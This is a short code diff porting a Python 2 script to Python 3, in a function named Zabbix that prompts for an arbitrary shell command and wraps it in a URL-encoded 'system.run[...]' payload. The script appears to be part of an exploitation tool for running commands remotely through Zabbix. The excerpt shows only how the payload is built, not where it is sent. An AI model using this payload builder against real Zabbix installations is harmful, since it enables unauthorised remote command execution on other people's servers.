@@ -1,16 +1,16 @@
-import urllib
+from urllib import parse
 
 
 def Zabbix():
     print("\033[01m" + "\nExecute SHELL command: \n" + "\033[0m")
-    command = raw_input("\033[96m" + "\nEnter Shell Command to Execute: " + "\033[0m")
+    command = input("\033[96m" + "\nEnter Shell Command to Execute: " + "\033[0m")
 
     if not command:
         command = "ls"
 
     payload = "system.run[(" + command + ");sleep 2s]"
     finalpayload = (
-        urllib.quote_plus(payload)
+        parse.quote_plus(payload)
         .replace("+", "%20")
         .replace("%2F", "/")
         .replace("%25", "%")
